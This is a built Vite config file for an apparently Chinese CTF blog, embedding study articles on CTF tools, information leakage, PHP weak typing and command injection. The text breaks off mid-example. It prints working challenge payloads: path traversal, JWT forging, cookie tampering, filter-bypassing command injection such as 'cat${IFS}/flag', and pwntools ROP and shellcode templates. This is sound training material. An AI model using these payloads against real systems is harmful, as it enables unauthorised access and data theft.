// vite.config.js
import { defineConfig } from "file:///C:/Users/hwh/blog/frontend/node_modules/vite/dist/node/index.js";
import react from "file:///C:/Users/hwh/blog/frontend/node_modules/@vitejs/plugin-react/dist/index.js";
import { writeFileSync, mkdirSync, readFileSync, existsSync } from "fs";
import path from "path";
import { fileURLToPath } from "url";
import { join } from "path";

// src/data/articles.js
var articles = {
  tools: {
    title: "CTF \u5DE5\u5177\u4F7F\u7528\u6307\u5357",
    subtitle: "CTF Tools Guide",
    content: `
CTF \u6BD4\u8D5B\u4E2D\u5DE5\u5177\u7684\u4F7F\u7528\u81F3\u5173\u91CD\u8981\u3002\u8FD9\u91CC\u603B\u7ED3\u4E86\u6211\u5E38\u7528\u7684\u5DE5\u5177\u53CA\u5176\u4F7F\u7528\u6280\u5DE7\u3002

## IDA Pro \u2014 \u9006\u5411\u5206\u6790\u795E\u5668

IDA Pro \u662F\u6700\u5F3A\u5927\u7684\u9759\u6001\u53CD\u6C47\u7F16\u5DE5\u5177\uFF0CCTF \u9006\u5411\u5FC5\u5907\u3002

### \u57FA\u7840\u64CD\u4F5C

**\u6253\u5F00\u6587\u4EF6**
- \u62D6\u5165 PE/ELF \u6587\u4EF6\u5373\u53EF\u81EA\u52A8\u8BC6\u522B\u67B6\u6784
- \u9996\u6B21\u6253\u5F00\u9009\u62E9 "New"\uFF0C\u540E\u7EED\u9009 "Load existing" \u4FDD\u7559\u6CE8\u91CA

**\u5E38\u7528\u5FEB\u6377\u952E**

\`\`\`
Tab          # \u5207\u6362 Graph View / Text View
F5           # \u53CD\u7F16\u8BD1\u4E3A C \u4F2A\u4EE3\u7801\uFF08Hex-Rays \u63D2\u4EF6\uFF09
Shift+F12    # \u6253\u5F00\u5B57\u7B26\u4E32\u8868\uFF08\u627E\u654F\u611F\u5B57\u7B26\u4E32\uFF09
X            # \u67E5\u770B\u4EA4\u53C9\u5F15\u7528\uFF08\u627E\u51FD\u6570\u8C03\u7528\u4F4D\u7F6E\uFF09
R            # \u5C06\u6570\u636E\u8F6C\u4E3A\u5B57\u7B26\u663E\u793A
H            # \u5207\u6362\u6570\u636E\u683C\u5F0F\uFF08hex/dec/bin\uFF09
N            # \u91CD\u547D\u540D\u53D8\u91CF/\u51FD\u6570
Space        # \u5207\u6362\u53CD\u6C47\u7F16/\u5341\u516D\u8FDB\u5236\u89C6\u56FE
\`\`\`

**\u5B9E\u6218\u6280\u5DE7**

\u627E main \u51FD\u6570\u7684\u4E09\u79CD\u65B9\u6CD5\uFF1A
1. **\u5B57\u7B26\u4E32\u67E5\u627E\u6CD5**: Shift+F12 \u641C "flag"\u3001"password"\u3001"input" \u7B49
2. **\u957F\u9A71\u76F4\u5165\u6CD5**: \u4ECE\u7A0B\u5E8F\u5165\u53E3\u4E00\u6B65\u6B65\u8DDF\uFF0C\u9002\u5408\u7B80\u5355\u7A0B\u5E8F
3. **API \u5F15\u7528\u6CD5**: \u627E MessageBox\u3001scanf\u3001strcmp \u7B49\u5173\u952E API

\`\`\`
# \u793A\u4F8B\uFF1AHello CTF \u9898\u76EE
Shift+F12 \u2192 \u641C "please input" \u2192 \u53CC\u51FB\u8DF3\u8F6C \u2192 F5 \u770B\u4F2A\u4EE3\u7801
\u770B\u5230 strcpy \u548C strcmp\uFF0C\u5206\u6790\u903B\u8F91\u5373\u53EF
\`\`\`

---

## Burp Suite \u2014 Web \u6293\u5305\u6539\u5305

Web \u9898\u76EE\u5FC5\u5907\uFF0C\u62E6\u622A\u548C\u4FEE\u6539 HTTP/HTTPS \u8BF7\u6C42\u3002

### \u6838\u5FC3\u529F\u80FD

**Proxy \u6A21\u5757**
- Intercept: \u62E6\u622A\u8BF7\u6C42\uFF0C\u4FEE\u6539\u540E\u518D\u53D1\u9001
- HTTP history: \u67E5\u770B\u6240\u6709\u8BF7\u6C42\u5386\u53F2

**Repeater \u6A21\u5757**
- \u91CD\u653E\u5355\u4E2A\u8BF7\u6C42\uFF0C\u65B9\u4FBF\u6D4B\u8BD5 payload
- \u652F\u6301\u624B\u52A8\u4FEE\u6539\u4EFB\u610F\u5B57\u6BB5

**Intruder \u6A21\u5757**
- \u6279\u91CF\u7206\u7834\uFF1A\u7528\u6237\u540D\u3001\u5BC6\u7801\u3001\u76EE\u5F55\u7B49
- \u652F\u6301\u591A\u79CD\u653B\u51FB\u6A21\u5F0F\uFF08Sniper/Battering ram/Pitchfork/Cluster bomb\uFF09

### \u5E38\u7528\u64CD\u4F5C

\`\`\`
# \u62E6\u622A\u5E76\u4FEE\u6539 Cookie
Intercept On \u2192 \u6D4F\u89C8\u5668\u8BBF\u95EE\u76EE\u6807 \u2192 \u5728 Burp \u4E2D\u4FEE\u6539 Cookie: user=admin \u2192 Forward

# \u7206\u7834\u76EE\u5F55
Target \u2192 \u53F3\u952E "Engagement tools" \u2192 Discover content
\u6216 Intruder \u52A0\u8F7D\u5B57\u5178\u7206\u7834 /api/FUZZ
\`\`\`

---

## GDB / Pwndbg \u2014 PWN \u8C03\u8BD5

Linux \u4E0B\u4E8C\u8FDB\u5236\u8C03\u8BD5\u7684\u6807\u51C6\u5DE5\u5177\u3002

### \u57FA\u7840\u547D\u4EE4

\`\`\`
file ./pwn       # \u52A0\u8F7D\u76EE\u6807\u6587\u4EF6
run / r          # \u8FD0\u884C\u7A0B\u5E8F
break *main      # \u5728 main \u51FD\u6570\u4E0B\u65AD\u70B9
break *0x401000  # \u5728\u6307\u5B9A\u5730\u5740\u4E0B\u65AD\u70B9
continue / c     # \u7EE7\u7EED\u8FD0\u884C
next / n         # \u5355\u6B65\u6B65\u8FC7
step / s         # \u5355\u6B65\u6B65\u5165
info registers   # \u67E5\u770B\u5BC4\u5B58\u5668
x/10gx $rsp      # \u67E5\u770B\u6808\u5185\u5BB9\uFF0810\u4E2A64\u4F4D\u503C\uFF09
vmmap            # \u67E5\u770B\u5185\u5B58\u6620\u5C04\uFF08pwndbg\uFF09
checksec         # \u67E5\u770B\u4FDD\u62A4\u673A\u5236\uFF08pwndbg\uFF09
\`\`\`

### Pwndbg \u589E\u5F3A

\`\`\`
# \u5B89\u88C5
pip install pwntools
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# \u5E38\u7528\u529F\u80FD
context          # \u81EA\u52A8\u663E\u793A\u5BC4\u5B58\u5668\u3001\u6808\u3001\u4EE3\u7801
heap             # \u67E5\u770B\u5806\u7ED3\u6784
cyclic 100       # \u751F\u6210 De Bruijn \u5E8F\u5217\u627E\u504F\u79FB
\`\`\`

---

## Python + Pwntools \u2014 PWN \u81EA\u52A8\u5316

Pwntools \u662F CTF PWN \u65B9\u5411\u7684 Python \u5E93\uFF0C\u6781\u5927\u7B80\u5316 exploit \u7F16\u5199\u3002

### \u57FA\u7840\u7528\u6CD5

\`\`\`python
from pwn import *

# \u8FDE\u63A5\u8FDC\u7A0B\u670D\u52A1
p = remote('target.com', 1337)

# \u672C\u5730\u8C03\u8BD5
p = process('./pwn')

# \u9644\u52A0\u8C03\u8BD5\u5668
gdb.attach(p)

# \u63A5\u6536/\u53D1\u9001\u6570\u636E
p.recvuntil(b'input:')
p.sendline(b'payload')

# \u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u5229\u7528
p.sendline(fmtstr_payload(6, {elf.got['printf']: elf.sym['system']}))

# \u83B7\u53D6 shell \u540E\u4EA4\u4E92
p.interactive()
\`\`\`

### \u5E38\u7528\u529F\u80FD

\`\`\`python
context.arch = 'amd64'      # \u8BBE\u7F6E\u67B6\u6784
context.log_level = 'debug' # \u5F00\u542F\u8C03\u8BD5\u8F93\u51FA

# ELF \u6587\u4EF6\u64CD\u4F5C
elf = ELF('./pwn')
print(hex(elf.sym['main']))      # \u83B7\u53D6\u51FD\u6570\u5730\u5740
print(hex(elf.got['puts']))      # \u83B7\u53D6 GOT \u8868\u5730\u5740

# ROP \u5DE5\u5177
rop = ROP(elf)
rop.call(elf.sym['system'], [next(elf.search(b'/bin/sh'))])
payload = rop.chain()

# Shellcode
context.arch = 'amd64'
sc = asm(shellcraft.sh())
\`\`\`

---

## \u5176\u4ED6\u5E38\u7528\u5DE5\u5177

| \u5DE5\u5177 | \u7528\u9014 | \u5178\u578B\u573A\u666F |
|------|------|----------|
| **checksec** | \u68C0\u67E5\u4E8C\u8FDB\u5236\u4FDD\u62A4 | \u67E5\u770B NX/PIE/Canary/RELRO |
| **ROPgadget** | \u67E5\u627E ROP \u94FE | \u6784\u9020 ROP payload |
| **one_gadget** | \u627E execve \u5730\u5740 | libc \u5229\u7528 |
| **strings** | \u67E5\u770B\u5B57\u7B26\u4E32 | \u5FEB\u901F\u627E flag \u683C\u5F0F |
| **binwalk** | \u6587\u4EF6\u5206\u6790 | \u63D0\u53D6\u9690\u85CF\u6587\u4EF6 |
| **zsteg** | LSB \u9690\u5199 | PNG \u56FE\u7247\u9690\u5199 |
| **steghide** | \u9690\u5199\u63D0\u53D6 | \u5E26\u5BC6\u7801\u7684\u56FE\u7247\u9690\u5199 |
| **CyberChef** | \u5728\u7EBF\u7F16\u7801\u8F6C\u6362 | Base64/Hex/URL \u7F16\u7801 |
| **Hashcat** | \u5BC6\u7801\u7834\u89E3 | \u7834\u89E3\u54C8\u5E0C |
| **John** | \u5BC6\u7801\u7834\u89E3 | zip/pdf \u6587\u4EF6\u7834\u89E3 |

---

## \u901F\u67E5\u8868

### \u5FEB\u901F\u542F\u52A8\u547D\u4EE4

\`\`\`bash
# IDA
ida64 ./binary

# GDB
pwndbg ./binary

# Burp
java -jar burpsuite_community.jar

# Python exploit
python3 exp.py
\`\`\`

### \u5E38\u7528 Payload \u6A21\u677F

\`\`\`python
# \u57FA\u7840\u8FDE\u63A5\u6A21\u677F
from pwn import *
context.log_level = 'debug'
p = remote('host', port)
# p = process('./pwn')
# gdb.attach(p)

p.recvuntil(b':')
p.sendline(b'payload')
print(p.recvline())
p.interactive()
\`\`\`

---

**\u5EFA\u8BAE**\uFF1A\u5DE5\u5177\u53EA\u662F\u624B\u6BB5\uFF0C\u7406\u89E3\u539F\u7406\u624D\u662F\u6838\u5FC3\u3002\u591A\u5237\u9898\uFF0C\u591A\u52A8\u624B\uFF0C\u5DE5\u5177\u4F1A\u8D8A\u6765\u8D8A\u987A\u624B\u3002
`
  },
  infoleak: {
    title: "\u4FE1\u606F\u6536\u96C6\u4E0E\u6CC4\u9732",
    subtitle: "Information Gathering & Leakage",
    content: `
\u505A\u4FE1\u606F\u6536\u96C6\u8FD9\u7C7B\u9898\uFF0C\u6211\u6700\u5927\u7684\u611F\u53D7\u5C31\u662F**\u522B\u653E\u8FC7\u540E\u53F0\u7684\u6BCF\u4E00\u6761\u7EBF\u7D22**\u3002\u5F88\u591A flag \u5176\u5B9E\u5C31\u85CF\u5728\u773C\u76AE\u5E95\u4E0B\uFF0C\u53EA\u662F\u6211\u4EEC\u6CA1\u6CE8\u610F\u5230\u3002

## HTML \u6CE8\u91CA\u4E0E\u524D\u7AEF\u6CC4\u9732

\u6700\u65E9\u7684\u9898\u76EE\u5C31\u6709\u9690\u85CF\u5728 HTML \u6CE8\u91CA\u91CC\u7684 base64 \u5B57\u7B26\u4E32\u3002\u6211\u4E60\u60EF Ctrl+U \u770B\u6E90\u7801\uFF0C\u7ED3\u679C\u5728\u6CE8\u91CA\u4E2D\u53D1\u73B0\u4E00\u4E32\u53EF\u7591\u5B57\u7B26\u4E32\uFF0C\u89E3\u7801\u76F4\u63A5\u51FA flag\u3002

\`\`\`bash
echo 'ZmxhZ3sxM2Fh...' | base64 -d
# flag{13aab1b2-6ffc-40bb-b936-6bf02456afca}
\`\`\`

JSFuck \u662F\u53E6\u4E00\u4E2A\u524D\u7AEF\u6DF7\u6DC6\u7684\u91CD\u707E\u533A\u3002\u9875\u9762\u4E0A\u770B\u8D77\u6765\u662F\u4E00\u5806\u4E71\u7801 \`[\`] \`(\`) \`!\` \`+\`, \u5176\u5B9E\u662F JavaScript \u8868\u8FBE\u5F0F\u3002\u6700\u7B80\u5355\u7684\u65B9\u6CD5\u662F\u6253\u5F00\u6D4F\u89C8\u5668\u63A7\u5236\u53F0\uFF0C\u628A\u53D8\u91CF\u540D\u6216\u5BC6\u7801\u503C\u76F4\u63A5 \`eval()\`\uFF0C\u4E0D\u9700\u8981\u624B\u52A8\u89E3\u7801\u3002

\u9690\u85CF\u8868\u5355\u5B57\u6BB5\u4E5F\u662F\u4E00\u4E2A\u5BB9\u6613\u88AB\u5FFD\u7565\u7684\u70B9\u3002\u6709\u4E9B\u9898\u76EE\u628A \`is_admin\` \u6216 \`role\` \u8BBE\u4E3A \`type="hidden"\`\uFF0C\u4EE5\u4E3A\u7528\u6237\u6539\u4E0D\u4E86\u3002\u7528 Burp Suite \u62E6\u622A\u8BF7\u6C42\uFF0C\u628A\u503C\u4ECE 0 \u6539\u6210 1\uFF1A

\`\`\`bash
curl -X POST URL -d 'is_admin=1&nickname=test'
\`\`\`

## \u54CD\u5E94\u5934\u3001302 \u54CD\u5E94\u4F53\u4E0E\u534F\u8BAE\u5C42

\u7528 \`curl -I\` \u67E5\u54CD\u5E94\u5934\u662F\u57FA\u672C\u529F\uFF0C\u4F46\u6211\u5728\u8FD9\u9053\u9898\u4E0A\u5403\u8FC7\u4E8F\u2014\u2014\u5F53\u65F6\u53EA\u770B\u4E86 body\uFF0C\u5FFD\u7565\u4E86 \`X-Flag\` \u5B57\u6BB5\uFF0C\u5176\u5B9E flag \u5C31\u85CF\u5728\u54CD\u5E94\u5934\u91CC\u3002

\`\`\`bash
curl -I URL   # X-Flag: flag{...}
\`\`\`

\u66F4\u9690\u853D\u7684\u662F 302 \u91CD\u5B9A\u5411\u7684\u54CD\u5E94\u4F53\u3002\u5F88\u591A\u4EBA\u4EE5\u4E3A 302 \u53EA\u6709 Location \u5934\uFF0C\u6CA1\u6709 body\uFF0C\u4E8E\u662F\u76F4\u63A5 \`allow_redirects=True\` \u81EA\u52A8\u8DDF\u8FDB\uFF0C\u7ED3\u679C\u5B8C\u5168\u9519\u8FC7\u4E86\u85CF\u5728\u4E2D\u95F4\u54CD\u5E94\u91CC\u7684 flag\u3002

\`\`\`python
r = requests.post(url, data={'solved':'1'}, allow_redirects=False)
# \u9519\u8BEF\uFF1A\u76F4\u63A5follow\u4F1A\u9519\u8FC7body
# \u6B63\u786E\uFF1A\u9010\u5C42\u68C0\u67E5\u6BCF\u5C42\u54CD\u5E94\u7684body
if 'flag{' in r.text: print(r.text)
\`\`\`

## \u654F\u611F\u6587\u4EF6\u4E0E\u5907\u4EFD\u6587\u4EF6

\u8FD9\u9053\u9898\u7684\u5165\u53E3\u85CF\u5728 \`robots.txt\` \u91CC\uFF1A\`Disallow: /qcq.php\`\uFF0C\u8BBF\u95EE\u5373\u5F97 flag\u3002

\`\`\`bash
curl URL/robots.txt     # Disallow: /qcq.php
curl URL/qcq.php        # \u76F4\u63A5\u8BBF\u95EE
\`\`\`

\`.phps\` \u6587\u4EF6\u6CC4\u9732\u6E90\u7801\u4E5F\u662F\u7ECF\u5178\u2014\u2014PHP \u6587\u4EF6\u7684\u5907\u4EFD\u7248\u672C\u4F1A\u66B4\u9732\u5B8C\u6574\u903B\u8F91\uFF1A

\`\`\`bash
curl URL/index.phps     # \u6E90\u7801\u6CC4\u9732\uFF0C\u5BC6\u7801 QCyYdS
curl URL/?a=QCyYdS      # \u63D0\u4EA4\u5BC6\u7801
\`\`\`

\u5E38\u89C1\u7684\u5907\u4EFD\u6587\u4EF6\u540E\u7F00\u6211\u4E00\u822C\u4F1A\u6279\u91CF\u626B\uFF1A\`/index.phps\`\u3001\`.bak\`\u3001\`.swp\`\u3001\`.git/config\`\u3001\`/www.zip\`\u3002

## Cookie \u6CE8\u5165\u4E0E\u8BA4\u8BC1\u7ED5\u8FC7

Cookie \u6CE8\u5165\uFF08IDOR\uFF09\u6709\u65F6\u5019\u6BD4 SQL \u6CE8\u5165\u8FD8\u9690\u853D\u3002\u9898\u76EE\u7528 \`$_COOKIE['user']\` \u5224\u65AD\u6743\u9650\uFF0C\u76F4\u63A5\u6539 Cookie \u6BD4\u6539 URL \u53C2\u6570\u66F4\u76F4\u63A5\uFF1A

\`\`\`python
requests.get(url + '/wqw.php', cookies={'user': 'admin'})
# flag{ac4c342e-eee3-4c43-bce2-c4a4b42e8e2e}
\`\`\`

**\u5173\u952E**\uFF1A\u5FC5\u987B\u7528 Cookie \u5934\u800C\u4E0D\u662F URL \u53C2\u6570\u3002

JWT \u4F2A\u9020\u5219\u662F\u53E6\u4E00\u4E2A\u5178\u578B\u573A\u666F\u3002\u5982\u679C\u6E90\u7801\u91CC\u6CC4\u9732\u4E86 HMAC \u5BC6\u94A5\uFF0C\u5C31\u80FD\u7528 PyJWT \u4F2A\u9020\u4EFB\u610F\u8EAB\u4EFD\uFF1A

\`\`\`python
import jwt
token = jwt.encode({"iss":"admin"}, "ctfshow_jwt_admin", algorithm="HS256")
\`\`\`

## /proc/self/ \u6587\u4EF6\u7CFB\u7EDF\u5229\u7528

\u8FD9\u9053\u9898\u5F88\u5DE7\u5999\uFF1A\u4EE3\u7801\u9650\u5236\u4E86 \`$_GET['filename']\` \u957F\u5EA6\u5FC5\u987B\u5C0F\u4E8E 17\uFF0C\u4F46\u540C\u65F6\u7528 \`fopen\` \u5728 \`readfile\` \u4E4B\u524D\u9884\u5148\u6253\u5F00\u4E86\u4E00\u4E2A\u6587\u4EF6\u63CF\u8FF0\u7B26\u3002

\`\`\`bash
curl "URL/?filename=/proc/self/fd/5"
# flag{97e38d30-ef25-47ad-b102-45f1b4659fac}
\`\`\`

**\u5173\u952E**\uFF1A\`fopen\` \u5728 \`readfile\` \u4E4B\u524D\u6267\u884C\uFF0Cfd \u53F7\u53EF\u80FD\u662F 3/4/5\uFF0C\u9700\u9010\u4E00\u5C1D\u8BD5\u3002

## LFI \u8DEF\u5F84\u7A7F\u8D8A

\u9752\u5C91 CTF \u7684 ezinfoleak\uFF1A\u9875\u9762\u63D0\u4F9B\u6587\u4EF6\u6D4F\u89C8\u529F\u80FD\uFF0C\u4F46\u9650\u5236\u5728 \`/app/\` \u76EE\u5F55\u4E0B\u3002\u60F3\u8981\u8BFB\u6839\u76EE\u5F55\u7684 flag\uFF0C\u5C31\u9700\u8981\u8DEF\u5F84\u7A7F\u8D8A\uFF1A

\`\`\`bash
# \u4E00\u5C42\u4E0D\u591F\u5C31\u591A\u8BD5\u51E0\u5C42
curl "http://target/?file=../../../../fl4g.txt"
# flag{...}
\`\`\`

**\u5173\u952E**\uFF1A\u7A7F\u8D8A\u6DF1\u5EA6\u5F88\u91CD\u8981\u3002\u4ECE \`/app/sub/dir/\` \u56DE\u5230\u6839\u9700\u8981 \`../../../\`\u3002\u4E0D\u77E5\u9053\u5177\u4F53\u6DF1\u5EA6\u5C31\u4ECE 1 \u8BD5\u5230 10\u3002

## \u9690\u85CF\u6587\u4EF6\u4E0E\u6587\u6863 IDOR

CTFShow basic_12\uFF1A\u9875\u9762\u53EA\u663E\u793A\u4E00\u4E2A\u94FE\u63A5\uFF0CID \u4E3A 190\u3002\u8BD5\u8BD5\u76F8\u90BB\u7684 ID\uFF1A

\`\`\`bash
curl "http://target/?id=121"
# \u53D1\u73B0\u4E00\u4E2A\u9690\u85CF\u6587\u6863\uFF0Cflag \u5C31\u5728\u91CC\u9762\uFF01
\`\`\`

**\u6559\u8BAD**\uFF1A\u4E0D\u8981\u53EA\u76F8\u4FE1\u9875\u9762\u4E0A\u663E\u793A\u7684\u53C2\u6570\u503C\uFF0CIDOR \u7684\u53C2\u6570\u503C\u9700\u8981\u5927\u80C6\u53BB\u731C\u3002

---

**\u8E29\u5751\u6559\u8BAD**\uFF1A\u505A\u4FE1\u606F\u6536\u96C6\u9898\u76EE\uFF0C**\u6C38\u8FDC\u4E0D\u8981\u653E\u8FC7\u4EFB\u4F55\u4E00\u6761\u7EBF\u7D22**\u3002HTML \u6CE8\u91CA\u3001\u54CD\u5E94\u5934\u3001robots.txt\u3001\u5907\u4EFD\u6587\u4EF6\u3001Cookie\u3001JWT \u5BC6\u94A5\u2014\u2014\u6BCF\u4E2A\u89D2\u843D\u90FD\u53EF\u80FD\u85CF\u7740 flag\u3002
`
  },
  php: {
    title: "PHP \u5F31\u7C7B\u578B",
    subtitle: "PHP Weak Typing",
    content: `
PHP \u7684\u5F31\u7C7B\u578B\u6BD4\u8F83\u662F CTF \u4E2D\u6700\u7ECF\u5178\u7684\u77E5\u8BC6\u70B9\u4E4B\u4E00\uFF0C\u4E5F\u662F\u8FD9\u6B21\u5237\u9898\u91CC\u8E29\u5751\u6700\u591A\u7684\u5730\u65B9\u3002\u6838\u5FC3\u539F\u7406\u5F88\u7B80\u5355\uFF1APHP \u5728\u7528 \`==\` \u6BD4\u8F83\u65F6\u4F1A\u81EA\u52A8\u505A\u7C7B\u578B\u8F6C\u6362\uFF0C\u800C \`===\` \u4E25\u683C\u6BD4\u8F83\u5219\u4E0D\u4F1A\u3002

## \u5F31\u6BD4\u8F83\u7ED5\u8FC7\u6570\u5B57\u5224\u65AD

\u6700\u5178\u578B\u7684\u573A\u666F\u662F\u540C\u65F6\u8981\u6C42\u4E00\u4E2A\u53D8\u91CF"\u4E3A\u771F"\u4E14"\u7B49\u4E8E 0"\u3002\u770B\u8D77\u6765\u77DB\u76FE\uFF0C\u4F46 \`"0abc"\` \u5C31\u80FD\u540C\u65F6\u6EE1\u8DB3\uFF1A

\`\`\`php
if($a and $a==0)    // "0abc" == 0 \u4E14\u4E3A\u771F
if(!is_numeric($b)) // "2027a" \u542B\u5B57\u6BCD\u2192false
if($b > 2026)       // "2027a" > 2026
\`\`\`

Payload: \`?a=0abc&b=2027a\`

## array_search \u5F31\u7C7B\u578B

\`array_search\` \u9ED8\u8BA4\u7528 \`==\` \u6BD4\u8F83\uFF0C\u800C \`"QCCTF" == 0\` \u4E3A true\uFF0C\u6240\u4EE5\u5B83\u4F1A\u9519\u8BEF\u5730\u5339\u914D\u5230 index 0\uFF1A

\`\`\`php
$key = array_search("QCCTF", $qc); // "QCCTF"==0 \u2192 key=0\uFF08\u9519\uFF09
// \u9700\u8981 key===1\uFF0C\u6240\u4EE5 QCCTF \u5728 index 1
\`\`\`

Payload: \`?qc=["a","QCCTF"]\`

## \u5D4C\u5957\u5F31\u7C7B\u578B

\u66F4\u7ED5\u7684\u8FD8\u6709\u5D4C\u5957\u5F31\u7C7B\u578B\uFF1A\u8981\u6C42 \`0 == "QCyyds"\` \u4F46 \`0 !== "QCyyds"\`\uFF1A

\`\`\`php
// 0 == "QCyyds" \u4F46 0 !== "QCyyds" \u2713
\`\`\`

Payload: \`?qc={"0":"QCCTF","n":[0]}\`

## MD5 \u548C SHA1 \u7ED5\u8FC7

0e \u5F00\u5934\u7684\u54C8\u5E0C\u503C\u5728\u5F31\u6BD4\u8F83\u4E0B\u4F1A\u88AB\u5F53\u6210\u79D1\u5B66\u8BA1\u6570\u6CD5\uFF0C\u7B49\u4E8E 0\uFF1A

\`\`\`
GET ?a=QNKCDZO&b=240610708
\`\`\`

\u4F46\u9047\u5230 \`===\` \u4E25\u683C\u6BD4\u8F83\uFF0C0e \u7ED5\u8FC7\u5C31\u5931\u6548\u4E86\u3002\u8FD9\u65F6\u6570\u7EC4\u7ED5\u8FC7\u767B\u573A\uFF1A\`md5([])\` \u548C \`sha1([])\` \u5BF9\u6570\u7EC4\u90FD\u8FD4\u56DE NULL\uFF0C\u800C \`NULL === NULL\` \u4E3A true\uFF1A

\`\`\`
GET ?a[]=1&b[]=2
\`\`\`

---

## \u901F\u67E5\u8868

| \u573A\u666F | Payload | \u539F\u7406 |
|------|---------|------|
| \`== 0\` \u7ED5\u8FC7 | \`"0abc"\` | \u5B57\u7B26\u4E32\u5F00\u5934\u975E\u6570\u5B57\u5219\u7B49\u4E8E0 |
| is_numeric \u7ED5\u8FC7 | \`"2027a"\` | \u542B\u5B57\u6BCD\uFF0C\u4E0D\u662F\u7EAF\u6570\u5B57 |
| 0e MD5 \u7ED5\u8FC7 | \`QNKCDZO\` | 0e \u5F00\u5934\u7684 hash \u88AB\u5F53\u79D1\u5B66\u8BA1\u6570\u6CD5 |
| md5/sha1 \u4E25\u683C\u6BD4\u8F83 | \`?a[]=1&b[]=2\` | \u6570\u7EC4\u8FD4\u56DE NULL\uFF0CNULL===NULL |
| array_search | \`["a","QCCTF"]\` | "QCCTF" \u5728 index 1 |

## \u53D8\u91CF\u8986\u76D6

ISCC \u7684\u4E00\u9053\u9898\uFF1A\u4EE3\u7801\u7528 \`foreach($_GET as $k => $v) $$k = $v;\` \u5B9E\u73B0\u4E86\u53D8\u91CF\u8986\u76D6\u3002

\`\`\`php
// \u901A\u8FC7 URL \u4F20\u53C2\u8986\u76D6\u4EFB\u610F\u53D8\u91CF
// \u6E90\u7801\u6CE8\u91CA\u91CC\u85CF\u7740\u5173\u952E\u53D8\u91CF\u540D\u548C\u671F\u671B\u503C
GET ?key=[]&expected=test
\`\`\`

\u7528\u7A7A\u6570\u7EC4 \`[]\` \u6253\u7834\u5B57\u7B26\u4E32 === \u7684\u4E25\u683C\u6BD4\u8F83\u3002\u53D8\u91CF\u8986\u76D6\u53EF\u4EE5\u77AC\u95F4\u7ED5\u8FC7\u590D\u6742\u7684 if \u5224\u65AD\u3002

**\u7ECF\u9A8C**\uFF1A
1. \u9875\u9762\u6E90\u7801\u6CE8\u91CA\u6C38\u8FDC\u4E0D\u8981\u5FFD\u7565\uFF0C\u5173\u952E\u8BCD\u548C\u53D8\u91CF\u540D\u5E38\u85CF\u5728\u90A3\u91CC
2. \u7A7A\u6570\u7EC4\u5728\u5F31\u7C7B\u578B\u6BD4\u8F83\u4E2D\u662F\u4E2A\u4E07\u80FD\u5DE5\u5177

---

**\u8E29\u5751\u6559\u8BAD**\uFF1A
1. \u6C38\u8FDC\u5148\u770B\u6E05 \`==\` \u8FD8\u662F \`===\`\uFF0C\u4E24\u79CD\u7ED5\u8FC7\u601D\u8DEF\u5B8C\u5168\u4E0D\u540C
2. \`array_search\` \u7684\u5F31\u7C7B\u578B\u9677\u9631\u5BB9\u6613\u88AB\u5FFD\u7565\uFF0C\u9ED8\u8BA4\u884C\u4E3A\u4E0D\u662F\u4E25\u683C\u6BD4\u8F83
3. 0e \u7ED5\u8FC7\u7684\u5B57\u7B26\u4E32\u8981\u9A8C\u8BC1 MD5 \u540E\u786E\u5B9E\u662F 0e \u5F00\u5934\u5168\u6570\u5B57
`
  },
  cmd: {
    title: "\u547D\u4EE4\u6CE8\u5165",
    subtitle: "Command Injection",
    content: `
\u547D\u4EE4\u6CE8\u5165\u7684\u8003\u70B9\u4ECE\u7B80\u5355\u5230\u53D8\u6001\uFF0C\u5C42\u5C42\u52A0\u7801\uFF0C\u6BCF\u4E00\u9053\u9898\u90FD\u5728\u8003\u9A8C\u5BF9 Linux \u547D\u4EE4\u884C\u548C PHP \u51FD\u6570\u7684\u7406\u89E3\u6DF1\u5EA6\u3002

## \u57FA\u7840\u6CE8\u5165\u4E0E\u7ED5\u8FC7

\u6700\u57FA\u7840\u7684\u9898\u76EE\u8F93\u5165\u76F4\u63A5\u62FC\u8FDB \`system()\`\uFF0C\u6CA1\u6709\u4EFB\u4F55\u8FC7\u6EE4\uFF1A

\`\`\`
POST cmd=cat /flag
\`\`\`

\u7A0D\u5FAE\u52A0\u4E86\u70B9\u6599\u2014\u2014\u8FC7\u6EE4\u4E86 flag \u5173\u952E\u8BCD\u2014\u2014\u5C31\u7528\u5206\u53F7\u622A\u65AD\uFF1A

\`\`\`
POST cmd=ip;cat /flag
\`\`\`

\u8FC7\u6EE4\u4E86\u7A7A\u683C\u600E\u4E48\u529E\uFF1FLinux \u4E0B \`$IFS\` \u662F\u5185\u90E8\u5B57\u6BB5\u5206\u9694\u7B26\uFF1A

\`\`\`
POST cmd=cat\${IFS}/flag
\`\`\`

## \u65E0\u5B57\u6BCD RCE \u2605\uFF08\u4E00\u8840\uFF09

\u8FC7\u6EE4\u4E86\u6240\u6709 a-zA-Z \u5B57\u6BCD\uFF0C\u770B\u8D77\u6765\u5B8C\u5168\u6CA1\u6CD5\u6784\u9020\u547D\u4EE4\u3002\u4F46 Linux \u7684 \`.\` \u547D\u4EE4\uFF08\u7B49\u4EF7\u4E8E \`source\`\uFF09\u53EF\u4EE5\u8BFB\u53D6\u5E76\u6267\u884C\u6587\u4EF6\u5185\u5BB9\uFF0C\u800C\u5B83\u672C\u8EAB\u4E0D\u662F\u5B57\u6BCD\uFF1A

\`\`\`
POST /?cmd=. /????.??? 2>&1
\`\`\`

\`/????.???\` \u5339\u914D \`/flag.txt\`\uFF0C\`.\` \u6267\u884C\u6587\u4EF6\u5185\u5BB9\uFF0C\u9519\u8BEF\u4FE1\u606F\u6CC4\u9732 flag\u3002

**\u5173\u952E\u7EC6\u8282**\uFF1A\`system()\` \u53EA\u6355\u83B7 stdout\uFF0C\u800C source \u6267\u884C\u4E0D\u5B58\u5728\u6587\u4EF6\u65F6\u9519\u8BEF\u4FE1\u606F\u8D70\u7684\u662F stderr\uFF0C\u5FC5\u987B\u52A0 \`2>&1\` \u628A stderr \u91CD\u5B9A\u5411\u5230 stdout \u624D\u80FD\u770B\u5230 flag\uFF01

## PHP \u51FD\u6570\u8C03\u7528\u94FE

\u5982\u679C\u9898\u76EE\u628A\u547D\u4EE4\u6267\u884C\u5C01\u88C5\u5728 PHP \u7684 \`eval\` \u6216 \`system\` \u91CC\uFF1A

\`\`\`php
// ezcmd_6: eval\u6267\u884C
POST qc=system("cat /flag")

// ezcmd_7: \u5173\u952E\u8BCD\u8FC7\u6EE4\uFF0C\u5B57\u7B26\u4E32\u62FC\u63A5
POST qc=system("cat /fl"."ag")

